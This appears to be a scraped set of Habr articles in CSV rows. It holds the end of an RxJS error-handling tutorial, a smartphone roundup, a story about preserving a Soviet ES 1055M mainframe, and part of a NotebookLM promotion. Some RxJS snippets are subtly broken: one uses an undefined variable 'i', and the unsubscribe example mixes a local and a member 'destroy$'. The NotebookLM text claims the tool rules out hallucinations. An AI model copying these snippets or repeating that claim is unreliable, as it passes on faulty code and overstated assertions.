        delay: (error, retryCount) => timer(1000 * 2 ** i)
    }),
    catchError(err => this.fallbackStrategy())
));
Статистика из практики:
Успешное восстановление в большинстве случаев при 4 попытках.
4. Стратегия ""Тихий отказ""
Для чего
Не критичные к данным компоненты
Демо-режимы
Возможна деградация функционала (переход со стримов на http-запросы)
Реализация
this.liveUpdates$ = websocketStream.pipe(
    catchError(() => interval(5000).pipe(
            switchMap(() => this.http.get('/polling-endpoint'))
        )
    )
);
Эффект:
Пользователь продолжает работу в ограниченном режиме.
5. Стратегия ""Явного краха""
Когда нужно
Операции с деньгами
Юридически значимые действия
Системы безопасности
Реализация
processTransaction().pipe(
    tap({error: () => this.rollbackTransaction()}),
    catchError(error => {
        this.showFatalError();
        throw error;
    })
);
Золотое правило:
Лучше явная ошибка, чем некорректное состояние.
Чек-лист выбора стратегии
Насколько критична операция?
Деньги/безопасность → ""Явный крах""
Просмотр данных → ""Тихий отказ""
Как часто возникают ошибки?
Часто → ""Эшелонированная защита""
Редко → ""Острова безопасности""
Какие ресурсы доступны?
Есть кеш → ""Умный повтор""
Нет резервов → ""Тихий отказ""
""Стратегия без метрик — как компас без стрелки""
— Принцип observability в микросервисах
Распространённые ошибки новичков: как не наступить на грабли
1. Молчаливое проглатывание ошибок
❌ Проблемный подход
this.http.get('/api/data').subscribe(data => {
  // Ошибки? Какие ошибки?
  this.render(data);
});
Последствия:
Пользователь видит ""зависший"" интерфейс, ошибки не логируются.
✅ Правильное решение
this.http.get('/api/data').subscribe({
    next: data => this.render(data),
    error: err => this.handleError(err) // Всегда обрабатываем ошибку
});
2. Бесконечные повторы
❌ Опасный код
this.http.get('/api/orders').pipe(
    retry() // Бесконечный цикл при 500 ошибке
);
Риски:
DDoS своего же сервера.
✅ Безопасный вариант
retry(3) // Чёткий лимит попыток
3. Игнорирование отписок
❌ Типичная ситуация
ngOnInit()
{
    interval(1000).subscribe(data => {
        // При переходе на другой роут — подписка живёт вечно
        this.updateRealTimeData(data);
    });
}
Эффект:
Утечки памяти, конфликты обновлений.
✅ Профессиональный подход
let destroy$ = new Subject<void>();

ngOnInit()
{
    interval(1000).pipe(
        takeUntil(this.destroy$)
    ).subscribe(...);
}

ngOnDestroy()
{
    this.destroy$.next();
    this.destroy$.complete();
}
4. Глобальный перехватчик как ""мусорка""
❌ Антипаттерн
// global-error-handler.ts
handleError(error)
{
    // Ловим ВСЕ ошибки без разбора
    this.sentry.captureException(error);
}
Проблема:
Невозможно кастомизировать обработку для конкретных сценариев.
✅ Стратифицированный подход
// Локальная обработка
catchError(err => handleLocalError(err))

// Глобальный перехватчик
handleError(error)
{
    if (error.isCritical) {
        this.sentry.captureException(error);
    }
}
Чек-лист для самопроверки
Все ли подписки имеют обработку error?
Есть ли ограничения у retry?
Используется ли takeUntil для отписок?
Разделены ли глобальные и локальные ошибки?
«Ошибки — как грабли: чтобы перестать наступать, нужно сначала увидеть их в коде»
— Очередной ""ауф""-принцип из пацанских пабликов
Заключение: Ошибки как путь к мастерству
Что мы узнали?
За последние годы работы с RxJS я понял: настоящее мастерство начинается там, где другие видят проблемы. Обработка ошибок — не рутина, а искусство проектирования отказоустойчивых систем.
Главные уроки:
Обработка ошибок — индикатор зрелости кода
Каждый catchError в вашем коде — это шаг к профессиональному уровню.
Повторы ≠ панацея
Правильно настроенный и продуманный retry спасёт там, где базовая реализация навредит.
Куда двигаться дальше?
Экспериментируйте с комбинациями
Пример продвинутой цепочки:
data$.pipe(
  retryWhen(exponentialBackoff(1000, 3)),
  catchError(switchToCache),
  finalize(cleanup)
)
Изучайте реальные кейсы
Исходники Angular HttpClient и Ngrx — кладезь паттернов.
Делитесь знаниями
Напишите пост о своей самой сложной ошибке — это лучший способ закрепить опыт.
""За 20 лет в разработке я видел много 'идеальных' систем. Все они ломались. Выживали те, где ошибки были частью дизайна.""
— Кто-то это, определенно, когда-то кому-то сказал*
Ваш следующий шаг:
Откройте свой последний проект. Найдите хотя бы один поток без обработки ошибок — и превратите его в пример надёжности. Помните: каждый обработанный сбой — это спасённые часы поддержки и тысячи довольных пользователей."
"5 смартфонов, ломающих привычные представления о мобильной технике",https://habr.com/ru/companies/ru_mts/articles/910148/,"Выбор телефона часто сводится к спору iOS vs Android, сравнению камер и автономности. Но за пределами экосистем Apple, Samsung и Xiaomi есть странные, экспериментальные устройства, нарушающие все кано...","Выбор телефона часто сводится к спору iOS vs Android, сравнению камер и автономности. Но за пределами экосистем Apple, Samsung и Xiaomi есть странные, экспериментальные устройства, нарушающие все каноны. Это концепты или продукты для энтузиастов: с вынимаемыми экранами и сменными клавиатурами. В этой подборке  как раз такие девайсы — от «анти-смартфона» с монохромным OLED до бронированного телефона с отсоединяемым мини-дисплеем. В массмаркете вы их не встретите. Поехали!
Sidephone: минималистичный смартфон со сменной клавиатурой
Источник
Sidephone — попытка изменить современную концепцию смартфона. Внешне устройство выглядит как звонилка из 2000-х: небольшой сенсорный экран, под ним — физическая клавиатура, габариты, как у старых Nokia. Но на деле это современный телефон на Android. Разработчики постарались избавиться от всего, а это делает обычные смартфоны пожирателями внимания.
Вместо привычной ленты уведомлений, бесконечных видео и навязчивых приложений здесь строго необходимый минимум. WhatsApp, Uber, Apple Music — да. TikTok и прочие «ловушки дофамина» — нет. Google Play Store нет, но APK можно устанавливать вручную. Но это не все.
Вот так могут выглядеть сменные клавиатуры. Источник
Ключевая фишка Sidephone — сменные клавиатуры. Они крепятся на магниты и защелки. Производитель предлагает разные варианты — от классической цифровой до панели с крупными кнопками и экспериментальных решений со множеством мелких клавиш. Сменить можно без выключения девайса, «на горячую». Модульный подход, который предлагают разработчики, потенциально открывает дорогу аксессуарам вроде геймпадов или тачпадов. Идея весьма интересная.
Так выглядит процесс смены клавиатуры. Источник 
Внутри типичная начинка для простого Android-устройства: процессор MediaTek, 4 Гб оперативки, LTE-модем и базовая камера. Хватит, чтобы оставаться на связи, но не залипать.
Технические характеристики:
экран: 2,8"", сенсорный, 480×640 пикселей;
процессор: MediaTek MT8766 (4 ядра Cortex-A53, 2 ГГц);
графика: Imagination GE8300 (660 МГц);
оперативная память: 4 Гб;
встроенная: 64 Гб;
камера: 12 Мп;
связь: 4G LTE (глобальная поддержка), Wi-Fi, Bluetooth;
аккумулятор: 1 800 мА·ч;
порт: USB-C;
ОС: кастомный Android без Play Store;
габариты: 126×55×12,5 мм.
Sidephone выходит в июне-июле этого года, ориентировочная цена — 249 $. Предзаказы обещают открыть «скоро». Когда именно, к сожалению, не сообщается.
Vivo X200 Ultra: смартфон, который решил стать камерой
Сам телефон с фотоаксессуарами. Источник
Компания Vivo представила смартфон, выделяющийся на фоне конкурентов благодаря своей фокусировке на мобильной фотографии: модель X200 Ultra создавалась именно с этой целью. К ней даже можно прикупить съемный объектив и саппорт для руки. 
X200 Ultra — мощный телефон. У него топовый чип Snapdragon 8 Elite, до 16 Гб оперативки и до 1 Тб встроенной памяти. Но основное внимание уделено оптике. На задней панели расположено сразу три камеры от Zeiss. Главный модуль — 50 Мп, с эквивалентным фокусным расстоянием 35 мм и апертурой f/1.69. Ширик — тоже 50 Мп, с 14 мм и f/2.0. И, наконец, настоящий монстр — это 200-мегапиксельный телеобъектив (85 мм, f/2.27), созданный на базе сенсора Samsung HP9. Он дает 3,7-кратный оптический зум. Все три камеры оснащены оптической стабилизацией изображения.
Если и этого мало, Vivo предлагает Photographer Kit — набор, включающий съемный хват, кнопку записи, управляющий диск и зум-рычажок. В комплекте идет дополнительная батарея на 2 300 мА·ч и внешний телеобъектив с 2,35×-увеличением, который суммарно дает до 8,7× оптического зума вместе с базовым модулем. Для фанатов мобильной фотографии и энтузиастов это, без сомнения, привлекательная фича.
Технические характеристики:
экран: 6,82"", AMOLED, 3 168×1 440 пикселей, 120 Гц;
процессор: Qualcomm Snapdragon 8 Elite;
ОЗУ: до 16 Гб;
встроенная память: до 1 Тб;
основная камера:
50 Мп (35 мм экв., f/1.69, Sony LYT-818, 1/1.28"");
50 Мп ультраширокая (14 мм экв., f/2.0, Sony LYT-818, 1/1.28"");
200 Мп телеобъектив Zeiss APO II (85 мм экв., f/2.27, Samsung HP9, 1/1.4"");
зум: 3,7× оптический (до 8,7× с внешним объективом);
стабилизация: оптическая, на всех трех камерах;
аккумулятор: 6 000 мА·ч + 2 300 мА·ч (в кит-наборе);
подключение: 5G, Wi-Fi, Bluetooth;
операционная система: Android (версия не указана);
доступность: Китай.
Пока X200 Ultra официально продается только в Китае (с апреля 2025 г.). Базовая версия стоит 891 $, а Photographer Kit обойдется в дополнительные 355 $. 
Bigme HiBreak Pro: E-Ink-смартфон
Источник
На первый взгляд Bigme HiBreak Pro — небольшая электронная книга. Черно-белый 6,13-дюймовый E-Ink-дисплей, отсутствие цветной картинки и привычная зернистость экрана вызывают ассоциации с ридерами вроде Kindle. На самом деле перед нами полноценный Android-смартфон с поддержкой 5G, свежим чипом MediaTek и внушительным объемом памяти.
HiBreak Pro получил процессор Dimensity 1080, а еще у него 8 Гб оперативной и 256 Гб встроенной памяти. Работает девайс под управлением Android 14 и поддерживает Google Play Store «из коробки». Производитель, компания Bigme, утверждает, что оболочка оптимизирована под E-Ink. Например, реализован собственный режим SSS-level refresh, который ускоряет отрисовку и минимизирует эффект «призраков», характерный для чернильных экранов. Конечно, это все равно не AMOLED, но интерфейс заметно шустрее, чем у обычных ридеров.
Экран — greyscale E-Ink с разрешением 824×1648 точек (300 ppi). У него есть регулировка цветовой температуры фронтальной подсветки: можно сделать свет теплым или холодным, чтобы снизить нагрузку на глаза. Версию с цветным дисплеем пока не выпустили, но в прошлой модели такая опция была.
HiBreak Pro оснащен задней камерой на 20 Мп и фронтальной на 5 Мп. Тыловая может использоваться как сканер: поддерживается OCR и даже функция преобразования текста в речь. Эта возможность превращает смартфон в инструмент для чтения, архивирования и прослушивания книг. NFC и инфракрасный порт также на месте — можно и оплатить, и телевизором покомандовать.
Технические характеристики:
экран: 6,13"", 824×1 648 пикселей, E-Ink (greyscale), 300 ppi, с регулировкой цветовой температуры;
процессор: MediaTek Dimensity 1080 (2× Cortex-A78 @ 2,6 ГГц + 6× Cortex-A55 @ 2 ГГц);
графика: Mali-G68 MC4;
ОЗУ: 8 Гб;
основная память: 256 Гб;
ОС: Android 14 (с Google Play Store);
камеры: задняя — 20 Мп, фронтальная — 5 Мп;
связь: 4G, 5G, Wi-Fi (2,4/5 ГГц), Bluetooth 5.2, NFC, ИК-порт;
батарея: 4 500 мА·ч, зарядка 18 Вт через USB Type-C;
безопасность: сканер отпечатков пальцев;
особенности: OCR, TTS, повышенная четкость изображения.
Bigme HiBreak Pro поступил в продажу в январе 2025 года и доступен для заказа на официальном сайте Bigme по цене 439 $.
Light Phone III — минималистичный смартфон с AMOLED-экраном, камерами и 5G
Источник
Это девайс от американского стартапа Light, исповедующего идею цифрового минимализма. Устройство рассчитано на тех, кто хочет оставаться на связи, но избегать соцсетей, браузеров и потоков уведомлений. Здесь вполне современный дисплей, камеры, поддержка 5G и другие базовые удобства, но все остальное предельно упрощено.
Девайс оснащен черно-белым 3,92-дюймовым AMOLED-экраном с разрешением 1080×1240 точек. Он матовый, с частотой обновления 60 Гц. Яркость регулируется с помощью физического колесика сбоку, которое также служит кнопкой фонарика. Камеры: 50 Мп сзади и 8 Мп спереди. Для съемки используется отдельная кнопка с фокусировкой на полунажатие. К слову, здесь нет ни редактора, ни возможности сразу поделиться снимками — все вручную.
На борту — LightOS, собственная ОС без магазина приложений. Доустановить ничего нельзя, пользователь получает лишь встроенные «инструменты»: звонки, сообщения, музыка, подкасты, будильник, навигатор, заметки, календарь, диктофон и калькулятор. Все работает быстро, но строго по делу. Интерфейс минималистичный, без отвлекающих анимаций и сложных меню.
Источник
Корпус алюминиевый, с защитой IP54. Смартфон поддерживает nanoSIM и eSIM, работает в сетях 4G и 5G, есть Bluetooth 5.0, NFC и GPS. Аккумулятор на 1 800 мА·ч — съемный, как и экран с портом USB-C. Устройство сделано с расчетом на долговечность и возможность ремонта. Разъема для наушников нет.
Технические характеристики:
экран: 3,92"", AMOLED, 1 080×1 240, монохромный;
процессор: Qualcomm SM4450;
оперативная память: 6 Гб;
встроенная: 128 Гб;
камеры: задняя — 50 Мп, фронтальная — 8 Мп;
связь: 5G, 4G, GPS, NFC, Bluetooth 5.0;
SIM: eSIM + nanoSIM;
аккумулятор: 1 800 мА·ч, съемный;
порт: USB-C;
ОС: LightOS;
размеры: 106×72×12 мм;
вес: 124 г;
защита: IP54.
Продажи стартовали 27 марта 2025 года. Цена — 799 $.
Oukitel WP200 Pro — «бронефон» со съемной гарнитурой
Источник
Oukitel WP200 Pro — защищенный смартфон с фокусом на автономность и необычный подход к аксессуарам. Его главная особенность — второй дисплей, встроенный в блок камер. Он отсоединяется и превращается либо в смарт-браслет, либо в Bluetooth-гарнитуру. 
Этот модуль показывает время, уведомления, управляет музыкой, может отслеживать шаги, пульс, сон и уровень кислорода в крови. В режиме браслета он крепится в комплектный ремешок и работает как фитнес-гаджет. В качестве гарнитуры — вставляется в ухо и соединяется по Bluetooth. А еще может использоваться как кнопка управления камерой.
Корпус — алюминиевый, сертифицирован по классу IP69K. То есть пыль, вода и удары ему не страшны. Телефон оснащен подэкранным сканером отпечатков, двойным лотком (2× nanoSIM или 1× nanoSIM + microSD) и поддерживает Wi-Fi 6, Bluetooth 5.3, 4G и 5G. Есть быстрая зарядка 45 Вт через USB-C. Аккумулятор на 8 800 мА·ч обеспечивает многодневную работу. Несмотря на крупные размеры (164×78×14 мм) и вес в 311 граммов, аппарат позиционируется как универсальный инструмент: и смартфон, и часы, и гарнитура.
Камеры тоже не подкачали: 108 Мп основной сенсор плюс макро и сенсор глубины (2 Мп и 0,3 Мп), фронтальная камера на 32 Мп.
Технические характеристики:
экран: 6,7"", AMOLED, 2 412×1 080 пикселей, 120 Гц, 500 нит;
процессор: MediaTek Dimensity 8200;
оперативная память: 24 Гб LPDDR5X;
накопитель: 1 Тб UFS 4.x;
камеры:
— задняя: 108 Мп (основная) + 2 Мп (макро) + 0,3 Мп (глубина);
— фронтальная: 32 Мп;
второй дисплей: съемный, с функциями смарт-часов и гарнитуры;
связь: 5G, 4G, Wi-Fi 6, Bluetooth 5.3;
SIM: 2× nanoSIM или 1× nanoSIM + microSD;
аккумулятор: 8 800 мА·ч, зарядка 45 Вт, USB-C;
безопасность: сканер отпечатков под экраном;
корпус: IP69K, алюминий;
размеры: 164×78×14 мм;
вес: 311 г.
Oukitel WP200 Pro доступен с марта 2025 года по цене 700 $. В продаже только ограниченная партия в 3 000 аппаратов.
Только зарегистрированные пользователи могут участвовать в опросе. Войдите, пожалуйста.
Какой из этих телефонов вам понравился больше всего?
16.18%
Sidephone
11
14.71%
Vivo X200 Ultra
10
23.53%
Bigme HiBreak Pro
16
25%
Light Phone III
17
20.59%
Oukitel WP200 Pro
14
Проголосовали 68 пользователей. Воздержались 25 пользователей."
В Политехнический музей будет передана одна из последних сохранившихся ЕС ЭВМ,https://habr.com/ru/companies/timeweb/articles/909434/,"К возможности написать эти строки мы шли более десяти лет. Теперь уже решено: фонды крупнейшего научно-технического музея страны скоро пополнятся узлами вычислительной машины ЕС 1055М, почти 40 лет бе...","К возможности написать эти строки мы шли более десяти лет. Теперь уже решено: фонды крупнейшего научно-технического музея страны скоро пополнятся узлами вычислительной машины ЕС 1055М, почти 40 лет бережно сохранявшейся в стенах ЦЭМИ — Центрального экономико-математического института.



Москвичам здание института известно как «дом с ухом» — по форме скульптурной композиции на фасаде, символизирующей ленту Мёбиуса. Сейчас вид на ЦЭМИ загораживают жилая высотка и АЗС, но когда-то на их месте был бассейн с фонтанами, вода в котором не остывала даже ночью. Дело в том, что бассейн, так любимый местными мальчишками, был устроен не для красоты, а для охлаждения вычислительных машин института.


В коллаже использовано фото пользователя aznazn с сайта pastvu.com

Бассейна больше нет, а габариты компьютеров уменьшились настолько, что теперь мощь нескольких тысяч советских ЭВМ каждый носит у себя в кармане. Большинство из этих «динозавров» давным-давно утилизированы или разграблены, и тем удивительнее, что эта участь миновала нашу сегодняшнюю героиню. Причём она ценна не только самим фактом своего существования, но и тем, что напрямую поучаствовала в реализации важнейшего проекта, результатами которого мы продолжаем пользоваться и сегодня. Но обо всём по порядку, и начнём мы с краткой истории института.

❯ Не всё идёт по плану

Как вы прекрасно знаете, экономика Советского Союза была плановой. Непосредственное управление и контроль осуществлял Госплан СССР, но его решениям была необходима научная база. В 1958 году под руководством академика Василия Сергеевича Немчинова была создана лаборатория экономико-математических методов, которая занималась исследованиями в области эконометрики, прикладной статистики и математического моделирования. Именно на базе этой лаборатории в 1963 году был создан Центральный экономико-математический институт.

Первое время он размещался в одном из зданий Академии наук на Ленинском проспекте, но установить там вычислительные машины было невозможно. Решение оказалось неожиданным: институту передали только что построенное здание на улице Бутлерова, которое изначально задумывалось как школьное (в дальнейшем это была школа №115). В самом просторном из помещений смонтировали ЭВМ «Урал-14». Так спортивный зал школы стал машинным.


Инженер М.Д. Ильменский за пультом «Урала-14»

Конечно, это был временный выход, и уже в 1966 году началось проектирование специального здания для ЦЭМИ. В соответствии с архитектурным стилем тех лет им должен был стать модернистский небоскрёб из стекла и бетона с минимумом украшений и максимумом функциональности. Предполагалось, что у ЦЭМИ будет один из самых мощных в СССР вычислительных центров, который займёт большую часть площадей. Легко заметить, что здание, построенное по проекту Леонида Павлова, состоит из двух неравных объёмов: один — для людей, другой — для чудовищ компьютеров.


Центральный экономико-математический институт АН СССР, 1980. Фото с сайта wikimapia.org

Но скорость развития вычислительной техники сыграла с архитекторами злую шутку. К моменту достройки здания, которая затянулась до конца 1970-х, габариты ЭВМ существенно уменьшились, и им уже не требовалось столько места. Часть просторных залов, отведённых под компьютеры, пришлось переделать под аудитории и кабинеты, которые к тому же оказалось сложно отапливать из-за огромной площади окон.

❯ Единая система

«Урал-14» в новый корпус ЦЭМИ уже не переехал. Вместо него в институте установили более современную ЭВМ — ЕС 1022, выпускавшуюся минским заводом им. Г.К. Орджоникидзе. Эта машина, самая массовая в Единой системе, имела среднее быстродействие 80 тыс. операций в секунду. Скоро ей на смену пришла ЭВМ следующего поколения — ЕС 1060. В ней впервые для серии появилась поддержка виртуальной памяти, вычислений с двойной точностью и автоматического повторения команд при сбоях. В качестве периферийного оборудования с ней поставлялись одни из самых современных на тот момент ленточных накопителей ЕС 5612М1 и сдвоенные жёсткие диски ЕС 5067.02 на 200 мегабайт (типичным объёмом дискового пакета для ЕС ЭВМ тогда скорее было 29 Мб). Эта техника в дальнейшем перешла «по наследству» к основной героине нашего рассказа — ЕС 1055М.


Накопители на магнитной ленте ЕС 5612М1

❯ Гость из Германии

Историки компьютерной техники говорят, что ЕС 1055М — самая «несоветская» из советских ЭВМ. Основные узлы машины были разработаны в ГДР отделением фирмы Robotron из г. Карл-Маркс-Штадта (ныне Хемниц), накопители и другая периферия производились в Болгарии. Но общая архитектура системы была спроектирована с участием советских специалистов.


ЕС 1055М в Технологическом музее в Дрездене

Производительность центрального процессора ЭВМ составляла 450–600 тыс. операций в секунду, ёмкость оперативной памяти — 1–2 Мб, а общая пропускная способность системы ввода-вывода — до 5 Мб/с. По меркам своего времени машина считалась достаточно быстрой, но всё же уступала по заявленным характеристикам ЕС 1060 (до 1 млн операций в секунду). Видимо, определяющей оказалась немецкая надёжность: по воспоминаниям сотрудников, хотя предыдущая машина считала быстро и могла за пару часов перещёлкать все накопившиеся задачки, потом она нередко вставала на недельный ремонт, а ЕС 1055М работала без сбоев.


Характерный двойной дисплей позволяет безошибочно отличить ЕС 1055М от других ЭВМ Единой системы

Управление ЕС 1055М велось с пульта ЕС 7069, оснащённого двумя электронно-лучевыми дисплеями. Интересно, что в пульт был встроен дисковод для дискет — не привычных нам 3,5-дюймовых, конечно, а 8-дюймовых, размером с грампластинку.


После передачи мы попробуем прочитать содержимое дискет

Для взаимодействия с ЭВМ в диалоговом режиме использовались терминалы ЕС 7927.01M, внешне похожие на персональные компьютеры.

❯ Машины и люди

ЕС 1055М проработала до начала XXI века, когда моральное устаревание и небезызвестная «ошибка 2000 года», сильно затронувшая системное ПО, сделали её дальнейшую эксплуатацию и модернизацию нецелесообразной. ЭВМ легко могла постигнуть судьба тысяч её сестёр, которые были списаны и утилизированы — не в последнюю очередь потому, что содержали в себе большое количество цветных и драгоценных металлов.

Как ни парадоксально, но безденежье девяностых, которое могло погубить машину, в каком-то смысле её же и спасло. Огромный компьютер стоял на девятом этаже здания, и при монтаже некоторые его узлы загружали через окна при помощи подъёмного крана.

На то, чтобы аккуратно демонтировать и вывезти ЭВМ, не повредив современные компьютерные системы ЦЭМИ (а он продолжал оставаться одним из опорных узлов межинститутской сети и вести экономические расчёты), потребовались бы значительные средства, которых не было. В итоге машину решили оставить как есть, просто отключив от питания, а современное оборудование разместили рядом с историческими шкафами и стойками.

Естественно, огромную роль сыграло и неравнодушие сотрудников. Главное сокровище ЦЭМИ — не сама раритетная ЭВМ, а люди, которые с ней работали. С середины 1960-х и по настоящее время отдел экономической информатики ЦЭМИ возглавляет кандидат технических наук, старший научный сотрудник, бывший зам. директора по научной работе Михаил Дмитриевич Ильменский — тот самый, которого вы ранее видели на фото с «Уралом-14».



В ходе общения он рассказал нам с коллегами огромное количество интересных фактов о работе института в советское время — думаю, об этом стоит сделать отдельный пост.

Непосредственно функционирование компьютеров и сетевых систем института более 40 лет поддерживают сотрудники отдела — Нина Григорьевна Ляпичева, Людмила Ивановна Герасимова и Людмила Вячеславовна Степанова.


Дежурная смена Отдела вычислительной техники ЦЭМИ, середина 1980-х годов. На заднем плане — ещё ЕС 1060.

❯ Вещь с историей

ЕС 1055М из ЦЭМИ не только использовалась для решения математических и планово-экономических задач, но и сыграла большую роль в развитии российских компьютерных сетей и в конечном счёте — интернета. В 1991 году ЭВМ была оснащена дополнительным блоком — процессором телеобработки данных ЕС 8375, разработанным в Казани. Это был первый в нашей стране промышленный образец телекоммуникационного оборудования.



На основе ЕС 1055М с процессором ЕС 8375 был поднят узел сети SUEARN — советского сегмента Европейской сети академических исследований. Через модемы и выделенные телефонные линии было установлено сетевое соединение ЦЭМИ с Институтом органической химии (ИОХ). В дальнейшем на базе ЦЭМИ, ИОХ и Института космических исследований (ИКИ) была создана сеть из трёх постоянно функционирующих узлов интернета, которая в числе первых вошла в состав Рунета (доменная зона .ru).

В середине 90-х поддержка доступа в интернет была переведена на мейнфрейм IBM 9370, но ЕС 1055М оставалась в качестве резервной. И только в 2000 году ЭВМ была окончательно заменена более современным оборудованием фирмы Sun Microsystems.

❯ Не потерять и не сломать


Пульт ЕС 7069 в процессе демонтажа

Передача столь крупной и сложной техники — операция, требующая тщательной подготовки. Прежде всего необходимо зафиксировать, как именно были размещены блоки ЭВМ и как они соединялись друг с другом. Затем нужно их правильно отключить — сделать это не так просто, поскольку основные кабельные соединения выполнены под фальшполом. Это был стандартный приём для машинных залов ЭВМ: на монолитный бетонный пол устанавливалась система стоек, а уже на них укладывался второй уровень пола из дюралюминиевых плиток размером 50×50 см.

Подготовку к перевозке блоков ЕС 1055М мы начали вдвоём с реставратором Максимом Тулузаковым. Он — прекрасный профессионал своего дела, ну а мне пригодился мой опыт восстановления ретротехники.

Даже такая вроде бы простая операция, как отключение и частичная разборка пульта управления ЭВМ, потребовала более пяти часов. Ещё столько же ушло на процессор телеобработки ЕС 8375.



Старые компьютеры не были рассчитаны на быструю сборку и разборку: как правило, после поставки ЭВМ бригада специалистов с завода-изготовителя выполняла монтаж и пусконаладочные работы в течение нескольких недель, а то и месяцев. Теперь нам нужно было выполнить обратную операцию, попутно помечая все отсоединяемые провода и кабели и фиксируя процесс разборки на фото. Это позволит сохранить блоки ЭВМ в максимально аутентичном виде и не исключает, что когда-то их вновь можно будет запустить в работу.



В годы разработки ЕС ЭВМ идея о том, что компьютер можно будет убрать в рюкзак или спрятать в карман, казалась научной фантастикой. Один только накопитель на магнитной ленте ЕС 5612М1 крупнее, чем средний холодильник, а таких в машине четыре. Жёсткие диски ЭВМ весят под 400 кг каждый — суммарно их восемь, плюс на каждые четыре приходится стойка контроллера аналогичного размера.


Накопитель на жёстких магнитных дисках ЕС 5067.02 со снятыми крышками. Монтаж выполнен навивкой

А как перевезти всё это в фондохранилище? Подъёмный кран к окнам ЦЭМИ уже никто не подгонит — нужно действовать аккуратнее, чтобы не мешать работе института. Эту задачу музей будет решать совместно с инженерной службой ЦЭМИ.

Перевозка будет осуществляться в несколько этапов. Ожидайте новой информации о судьбе ЕС 1055М и других интереснейших образцов вычислительной техники!


Разрабатывайте и развивайте свою игру (и не только) с помощью облачного хостинга для GameDev↩



Перед оплатой в разделе «Бонусы и промокоды» в панели управления активируйте промокод и получите кэшбэк на баланс."
NotebookLM: Как освоить сложные темы в 10 раз быстрее,https://habr.com/ru/articles/910186/,"Всем привет!
Меня зовут Александр, я COO в SaaS-платформе аналитики данных. Последний год активно изучаю внедрение AI-решений в кросс-функциональные процессы. Делюсь полезными материалами, которые счи...","Всем привет!
Меня зовут Александр, я COO в SaaS-платформе аналитики данных. Последний год активно изучаю внедрение AI-решений в кросс-функциональные процессы. Делюсь полезными материалами, которые считаю стоят внимания. В основном про AI, изменение процессов, тренды и продуктовое видение.
У себя в телеграм-канале делюсь сжатыми и структурированными саммери статей.
Осваивать сложные IT-темы стало проще. Инструмент NotebookLM работает исключительно с предоставленными вами материалами, исключая галлюцинации и обрабатывая одновременно до 25 миллионов слов. Это позволяет превратить массивы данных в структурированные заметки, интеллект-карты и даже интерактивные подкасты, ускоряя процесс обучения в разы.
Что, если я скажу вам, что существует инструмент на базе AI, который работает исключительно с вашими проверенными источниками (исключая галлюцинации), обрабатывает 25 миллионов слов одновременно и превращает ваши исследования в персонализированные подкасты, которым вы можете задавать вопросы во время пробежки? Именно это делает NotebookLM революционным средством для изучения сложных тем в 10 раз быстрее — и совершенно БЕСПЛАТНО.
Наш мозг имеет естественные ограничения при обработке новой информации. Несмотря на все наши усилия, изучение сложных тем требует значительного времени и умственной энергии. Модели AI, такие как ChatGPT, Grok и Claude, начали решать эту проблему, но все еще сталкиваются со значительными ограничениями.
Понимание текущих ограничений AI в обучении
Современные AI-помощники сталкиваются с двумя основными ограничениями:
Ограниченные окна контекста: Окно контекста — это объем текста, который LLM может ""помнить"" в любой момент времени. Представьте это как объем текста в вашем чате с ChatGPT. Чем больше информации обменивается, тем больше заполняется окно контекста. В итоге LLM предложит вам начать новый чат, заставляя восстанавливать контекст с нуля.
Галлюцинации: Модели AI часто генерируют правдоподобно звучащую, но неверную информацию при работе со сложными темами или когда они достигают границ своих знаний. Эти ""галлюцинации"" могут вредить вашему процессу обучения, смешивая факты с вымыслом.
Добро пожаловать в NotebookLM
В отличие от конкурентов, NotebookLM предлагает принципиально иной опыт, разработанный специально для улучшения процесса обучения.
Окно контекста NotebookLM
Вместо того чтобы соревноваться за то, чтобы быть самым умным, дешевым или быстрым, NotebookLM фокусируется на одной цели: помочь вам учиться в 10 раз быстрее — и БЕСПЛАТНО. Он обрабатывает впечатляющие 25 миллионов слов (около 50 000 книжных страниц) и работает только с предоставленными вами источниками, превосходя другие LLM в обработке контекста и фактической достоверности.
В то время как другие AI-помощники обрабатывают эквивалент одной книги, NotebookLM одновременно справляется с объемом материала, сравнимым с целой книжной полкой. Это отличный партнер по исследованиям для изучения новых тем — вы даже можете создать свой собственный подкаст на основе предоставленных вами ресурсов.
Прежде чем объяснить, как использовать этот мощный инструмент, давайте посмотрим, что отличает NotebookLM от других AI-помощников.
Что отличает NotebookLM?
Думайте о NotebookLM как о вашем персональном помощнике по исследованиям с гораздо большим окном контекста и минимальными галлюцинациями, благодаря его конструкции ""закрытой системы"". В отличие от стандартных AI-помощников, которые извлекают информацию из своих общих обучающих данных, ""закрытая система"" означает, что NotebookLM работает исключительно с конкретными источниками, которые вы предоставляете.
Этот целенаправленный подход означает, что NotebookLM не отвечает на вопросы, основанные на общих знаниях — он анализирует и синтезирует только ту информацию, которую вы в него загружаете. Ограничивая свои ответы вашими проверенными источниками, такая конструкция значительно сокращает галлюцинации, позволяя при этом достичь более глубокого понимания выбранных вами тем.
Вот несколько повседневных сценариев использования NotebookLM:
Планирование поездок: Загрузите путеводители, отзывы об отелях и местные блоги, чтобы получить персонализированные маршруты, основанные на ваших интересах.
Управление здоровьем: Анализируйте свои медицинские записи, заметки врача и статьи о здоровье, чтобы лучше понимать свои состояния и варианты лечения.
Изучение новых хобби: Ускорьте изучение любого хобби, загрузив учебные пособия, обсуждения на форумах и руководства экспертов по таким темам, как садоводство, фотография или создание проектов с AI.
Эти примеры лишь верхушка айсберга возможностей. Истинная сила NotebookLM исходит от его трех ключевых возможностей, которые меняют ваше взаимодействие с информацией.
1. Мультимодальные входные данные (PDF, Youtube, веб-сайты и т.д.)
Мультимодальные входные данные NotebookLM
В отличие от других LLM, NotebookLM обрабатывает несколько форматов входных данных, включая Google Docs, URL, видео с YouTube и PDF в качестве ресурсов для изучения конкретных тем.
Волшебство происходит, когда вы добавляете свои источники. Каждое добавление расширяет вашу персонализированную вселенную знаний. Недавно я загрузил 9 различных ресурсов о Product-led Growth, и NotebookLM мгновенно связал концепции из казалось бы несвязанных источников, выявив закономерности, которые я бы упустил даже после нескольких недель традиционного исследования.
Поскольку NotebookLM работает исключительно с предоставленными вами источниками, подходите стратегически к тому, что вы загружаете. Качество и разнообразие материалов напрямую влияют на результаты, которые вы получите. Включайте различные точки зрения для получения всесторонней базы знаний.
Эта функция отлично подходит для сложных тем, требующих изучения нескольких источников. Если вы планируете поездку в Японию, вы можете загрузить путеводители, блоги о еде, PDF-документы о культурном этикете, транспортные карты, разговорники и видеозаписи пешеходных экскурсий — создавая всеобъемлющую базу знаний, которую NotebookLM синтезирует в ваш персонализированный маршрут путешествия.
